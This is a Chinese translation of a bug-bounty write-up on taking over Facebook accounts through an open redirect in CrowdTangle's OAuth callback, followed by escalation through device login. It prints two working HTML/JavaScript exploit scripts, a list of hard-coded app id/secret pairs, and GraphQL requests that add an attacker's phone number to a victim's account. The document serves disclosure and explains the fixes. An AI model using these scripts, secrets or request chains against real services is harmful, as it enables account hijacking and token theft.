> 原文链接: https://www.anquanke.com//post/id/240016 


# 由 OAuth 流程后的不安全重定向导致的 Facebook 账号接管


                                阅读量   
                                **116117**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者ysamm，文章来源：ysamm.com
                                <br>原文地址：[https://ysamm.com/?p=667﻿](https://ysamm.com/?p=667%EF%BB%BF)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t0130650c57c67f6488.jpg)](https://p4.ssl.qhimg.com/t0130650c57c67f6488.jpg)



## 漏洞描述

该漏洞允许恶意用户在窃取发给 **`apps.crowdtangle.com`** 的第一方 access_token 后实现对 Facebook 账号的接管。如果用户已经登录的话，**apps.crowdtangle.com** 的 Facebook 应用 OAuth 回调端点会将 access_token 重定向到另一个端点。而这里的另一个端点可以由攻击者来给出，这意味着如果我们能找到 apps.crowdtangle.com 中开放的重定向，它可以将 URL fragment （URL中的hash部分）部分中的 token 重定向到另一个网站，并用它来接管账户。而这种攻击并不需要用户参与交互。



## 详细说明

### <a class="reference-link" name="%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E5%8F%97%E9%99%90%E7%9A%84%20Facebook%20access_token"></a>窃取用户受限的 Facebook access_token
1. 如果一个没有执行登录操作的用户访问了 **`apps.crowdtangle.com`** 中任何一个需要用户登录的页面，那么这个被访问的页面将会被设置上一个 cookie（cookie **redirect_url**=https%3A%2F%2Fapps.crowdtangle.com%2FENDPOINT）。然后再重定向到 **`https://apps.crowdtangle.com/auth?type=0`** 。在用户登录之后，任何对 **`https://apps.crowdtangle.com/facebook/auth`** 端点的请求都会经302重定向到 cookie 中 **redirect_url** 所对应的 URL 。这里 redirect_url 中选定的端点可以被替换为其他开放的重定向端点。
<li>
**`apps.crowdtangle.com`** 的 Facebook 应用 id 为527443567316408，它的正确回调端点是 **`https://apps.crowdtangle.com/facebook/auth`** 。为了验证一个能够访问 **`https://apps.crowdtangle.com/auth/server`** 端点的用户，他/她将会被重定向到<br>**`https://apps.crowdtangle.com/facebook/auth`** ，然后再重定向到 **`https://www.facebook.com/v2.9/dialog/oauth?apps.crowdtangle.com/users/loginclient_id=527443567316408&amp;redirect_uri=https://apps.crowdtangle.com/facebook/auth&amp;response_type=code&amp;state=VALID_STATE`** 。若发送到 **apps.crowdtangle.com/users/login** POST 信息中存在有效回调，用户就可以成功登录了。<br>
也就是从现在开始，任何发送到 **`apps.crowdtangle.com/facebook/auth`** 的请求都将会重定向到 **`https://apps.crowdtangle.com/ENDPOINT`** 。</li>
1. 由于回调端点将会重定向到在第1步中由攻击者指定的任意 url 中（本例中为 **`https://apps.crowdtangle.com/ENDPOINT`** ） ，我们将会重发请求 **`https://www.facebook.com/v2.9/dialog/oauth?client_id=527443567316408&amp;redirect_uri=https://apps.crowdtangle.com/facebook/auth&amp;response_type=token`** ，这次请求的是一个 token ，并且 token 将会在 URL fragment 的部分返回，而不是作为该参数的代码（/facebook/auth#access_token=）。由于现在用户在第2步后已经登录了，端点 /facebook/auth/ 将重定向到 /ENDPOINT，浏览器将把哈希部分传递给下一 URL。**`apps.crowdtangle.com/ENDPOINT`** 端点将会重定向到攻击者的网站，在 URL fragment 部分中就包含着 token。
<li>
**`apps.crowdtangle.com/ENDPOINT`** 在攻击中将会被替换为开放的重定向端点。这里替换为 **`apps.crowdtangle.com/CUSTOM_PAGE/e/x/x/HASH、`** **`CUSTOM_PAGE`** 在这里可以是攻击者的页面或是任意一个公共页面，我们将操纵这里的 **HASH** 部分，这是一个经过编码的字符串，代表下一个 URL。</li>
执行所有上述操作后将会在 Crowdtangle Facebook 应用授权下生成 Facebook 用户的 access_token。以下是按顺序执行所有上述步骤攻击的脚本，将会在攻击者网站上收到 access_token。

```
&lt;html&gt;
&lt;body&gt;
&lt; script&gt;
cli = function()`{`
opn = window.open("https://apps.crowdtangle.com/CUSTOM_PAGE/e/x/x/HASH/");
setTimeout(function()`{`

opn.location.href = "https://apps.crowdtangle.com/auth/server";
setTimeout(function()`{`opn.location.href = "https://www.facebook.com/v2.9/dialog/oauth?client_id=527443567316408&amp;redirect_uri=https://apps.crowdtangle.com/facebook/auth&amp;state=ANY_STATE&amp;response_type=token";`}`,3000);
`}`,4000);
`}`
&lt;/ script&gt;
&lt;button onclick='cli()'&gt;Click&lt;/button&gt;
&lt;/body&gt;
&lt;/html&gt;
```

这里接到的 Facebook 用户 access_token 是第一方的（由 Facebook 拥有的应用所生成的），可以用来访问 **`https://graph.facebook.com/graphql`** 端点。然而，为这个特定应用程序（Crowdtangle）生成的 access_token 在进行 graphql 查询/更换时存在一些限制。正因为我们无法向账号中添加新的电话或邮箱地址，如果我们在接管该账号的情况下执行此类变更，就会导致 access_token 的失效。此外，账号的查询操作也是有限的，我无法收集有关被接管用户的重要信息。



## 将 access_token 权限提升到另一个第一方应用上，然后在进行账户接管

Facebook 支持[设备登录](https://developers.facebook.com/docs/facebook-login/for-devices/)。这是一个为了能够在电视等设备上使用临时代码（如验证码等）而不是用户邮箱和密码登录 Facebook 账号的功能。该认证机制将会按以下流程工作：

首先，请求设备登录的应用会向向 Facebook 请求一个临时代码，这时就会返回一个显示给 Facebook 用户的代码，如果用户接受使用该应用的话还会收到另一个获取用户 access_token 的代码 （这里我们将注意它的 retrieve_code）。然后，它会显示给用户以提示用户需要在 **`www.facebook.com/device`** 或在他/她的移动设备中输入的该代码。在输入代码后，用户将被提示是否接受使用该应用。如果他/她接受使用，该应用就会请求另一个带有 retrieve_code 的 API 端点，以此来返回用户的 access_token。

由于许多 Facebook 应用也在电视和手表等设备中使用这种登录方法，我们可以对这些应用进行逆向工程，获得它们用来请求向用户显示临时代码的 client_code。在显示给用户后，我们可以得到第一方的用户 access_token。

那么现在如何将上述内容和之前的攻击联系起来呢？因为前面的方法需要过多的用户交互（输入用户代码，接受使用应用，CSRF保护……），然后我们才能得到用户的 access_token，这一点通常被 Facebook 认为是安全的，并不会被攻击者利用。<br>
我们在这里可以做的是使用之前收集到的受限 access_token 来做一些 Graphql 查询，这样就能够返回我们在认证流程中使用的 CSRF token。由于 CSRF token 与用户浏览产生的会话无关，我们可以向其注入一个恶意的 URL，请求 Facebook 的 OAuth 端点，并直接让我们获得一个新的具有更高权限的 access_token。

在之前的攻击中，受害者会带着 access_token 被重定向到攻击者的网站。攻击者网站接收到 access_token，并进行以下步骤：
1. 向 **`https://graph.facebook.com/v2.6/device/login`** 发送一个POST请求，参数为 **`"scope=public_profile&amp;access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94"`**（注意这里并没有使用受害者的 access_token，但这里我们要创建一个向应用437340816620806授权的设备代码，这是一个允许设备登录的第一方应用）。我们会把 “user_code “标记为**USER_CODE**，把检索受害者 access_token 的 “code ”记为**RETRIEVE_CODE**。
1. 请求 https:// graph.facebook.com/graphql?access_token=**VICTIM_CROWDTANGLE_TOKEN**&amp;variables=`{`“userCode”: “**USER_CODE**“`}`&amp;doc_id=2024649757631908&amp;method=POST (USER_CODE来自之前的步骤)<br>**VICTIM_CROWDTANGLE_TOKEN** 是从 Crowdtangle 窃取的 access_token。这里是对 USER_CODE 的授权，同时也返回一个 CSRF “nonce”，我们将其记为**USER_NONCE**。
1. 在替换掉所有出现的 USER_CODE 和 USER_NONCE 后，将用户重定向到**`https://m.facebook.com/dialog/oauth/?app_id=437340816620806&amp;redirect_uri=https://m.facebook.com/device/logged_in/?user_code%3DUSER_CODE%26nonce%3DUSER_NONCE%26is_preset_code%3D0&amp;ref=DeviceAuth&amp;nonce=USER_NONCE&amp;user_code=USER_CODE&amp;auth_type=rerequest&amp;scope=public_profile&amp;qr=0&amp;_rdr`**。这里我们删除了 force_confirmation 参数，以避免产生用户交互。( 为了更好地理解这一点，请尝试执行步骤1并在m.facebook.com/device 中输入 user_code )。因为在前面的步骤中，我们已经生成了一个有效的与提供的 USER_CODE 相匹配的 CSRF token/nonce，这将在没有用户交互的情况下完美地工作。
1. 这就会重定向到 **`https://m.facebook.com/device/logged_in/`**，并附上一个 oauth 代码、一个有效的临时用户和有效的用户代码。应用的授权到这里就大功告成了。
1. 在攻击者这边，他/她会发起这个请求来检索不受限的第一方 access_token：
<li>在替换了RETRIEVE_CODE之后请求**`https://graph.facebook.com/v2.6/device/login_status?access_token=437340816620806|04a36c2558cde98e185d7f4f701e4d94&amp;code=RETRIEVE_CODE&amp;method=post`** 。这里会返回一个由437340816620806应用授权的第一方 access_token 。我们将它记为 **FIRST_PARTY**。<br>
攻击者将使用这个 token，通过添加一个电话号码的方式来接管账户。</li>


## 补充：

https:// graph.facebook.com/graphql?access_token=FIRST_PARTY&amp;doc_id=10153582085883380&amp;variables`{`“input”:`{`“client_mutation_id”:1,”actor_id”:”VICTIM_USER_ID”,”phone_number”:”ATTACKER_PHONE”`}``}`&amp;method=POST



## 确认：

https:// graph.facebook.com/graphql?access_token=FIRST_PARTY&amp;doc_id=10153582085808380&amp;variables`{`“input”:`{`“client_mutation_id”:1,”actor_id”:”VICTIM_USER_ID”,”confirmation_code”:”RECEIVED_CONFIRMATION_CODE”`}``}`&amp;method=POST

第二阶段的脚本将尝试获得一个从使用 Facebook 设备登录的 Facebook 应用中生成的 access_token。下面代码中进行了不止一次的尝试，因为如果用户之前没有使用过此类应用的话，他/她会被要求先对其进行授权。我们对所有的应用都进行了尝试，以确保用户在不参与交互的情况下实现对该应用的授权：

```
&lt;html&gt;
 &lt;body&gt;
 &lt; script&gt;
 keys = ["1348564698517390|007c0a9101b9e1c8ffab727666805038",
 "972631359479220|4122f9182c57154d89cab3cbb62259db",
 "155327495133707|a151725bc9b8808a800f4c891505e558",
 "1331685116912965|e334a1eca4d4ea9ac0c0132a31730663",
 "867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01",
 "437340816620806|04a36c2558cde98e185d7f4f701e4d94",
 "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e",
 "1692575501067666|3168904bd42ebb12bf981327de99179f",
 "522404077880990|f4b8e52fea9ccae9793e11b66cca3ae0",
 "233936543368280|b5790a8768f5fd987220d34341a8f1d8",
 "1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9",
 "628551730674460|b9693d3e013cfb23ec2c772783d14ce8",
 "1664853620493280|786621f3867f7ab1bfc0ff9d616803fc",
 "521501484690599|3153679748f276e17ffe16c3f3a06b14"];
 token = "";
 if (window.location.hash) `{`
 crowd_token = window.location.hash.split("=")[1];
 start_attack(null, keys.shift());
 `}`
 async function second_stage(wind, user_code, retrieve, key)`{`
     fetch("https://graph.facebook.com/graphql?access_token=" +crowd_token.toString() + '&amp;variables=`{`"userCode":"' + user_code + '"`}`&amp;server_timestamps=true&amp;doc_id=2024649757631908',`{`method:"POST", mode:"cors" ,credentials:"omit"`}`).then(response =&gt; response.json()).then(function(data)`{`
         if(data.data.device_request.device_record.nonce)`{`
         nonce = data.data.device_request.device_record.nonce;`}` else `{`nonce = "ignore"`}`;
         app_id = key.split("|")[0];
         wind.location.href = https://m.facebook.com/dialog/oauth/?app_id=$`{`app_id`}`&amp;redirect_uri=https%3A%2F%2Fm.facebook.com%2Fdevice%2Flogged_in%2F%3Fuser_code%3D$`{`user_code`}`%26nonce%3D$`{`nonce`}`%26is_preset_code%3D0&amp;ref=DeviceAuth&amp;nonce=$`{`nonce`}`&amp;user_code=$`{`user_code`}`&amp;auth_type=rerequest&amp;scope=public_profile&amp;qr=0&amp;_rdr;
 `}`); setTimeout(function()`{`     fetch("https://graph.facebook.com/v2.6/device/login_status?access_token=" + key + "&amp;code=" + retrieve + "&amp;locale=en_US&amp;method=post",`{`method:"POST", mode:"cors" ,credentials:"omit"`}`).then(response =&gt; response.json()).then(function(data)`{`if(data.access_token)`{`alert(data.access_token);`}` else if(!keys.length == 0)`{`start_attack(wind, keys.shift())`}` `}`)  `}`,7000)
 `}`
 function start_attack(wind, key)`{`
     if (!wind)`{`
     wind = window.open("about:blank");`}`
     fetch("https://graph.facebook.com/v2.6/device/login?access_token=" + key ,`{`method:"POST", mode:"cors" ,credentials:"omit"`}`).then(response =&gt; response.json()).then(function(data)`{`
     USER_CODE = data.user_code;
     RETRIEVE_CODE = data.code;
     if ( USER_CODE &amp;&amp; RETRIEVE_CODE)`{`
         second_stage(wind, USER_CODE, RETRIEVE_CODE, key);`}` 
     else `{`
         start_attack(wind, keys.shift())
     `}`
     `}`);
 `}`
 &lt;/ script&gt;
 &lt;/body&gt;
 &lt;/html&gt;
```

在这里，我们只是对新检索到的 token 进行提醒，但在现实生活中，我们会保存把这些 token 保存起来，然后像之前说明的那样，以后用它来对账户实现接管。



## 修复

Facebook 团队做了很多修复工作。
- 当 Crowdtangle 的用户登录后，如果之前在 cookie 中设置了redirect_url，它会尝试先删除该cookie，如果没有设置 redirect_url 的话，当访问**`https://apps.crowdtangle.com/facebook/auth`** 时就会被重定向到redirect_url cookie 内指定的 URL，但会在 URL 后加上字符#。这样就能阻止之前的 fragment 被传递到下一个 URL。
<li>
**`https://apps.crowdtangle.com/CUSTOM_PAGE/e/x/x/HASH/`** 中的开放重定向问题已被修复。</li>
- CrowdTangle 的 access_token 现在不能用于访问 graph.facebook.com/graphql 端点（现在需要 app 的加密认证），这就能够阻止攻击者临时请求设备登录并提升 access_token 的权限。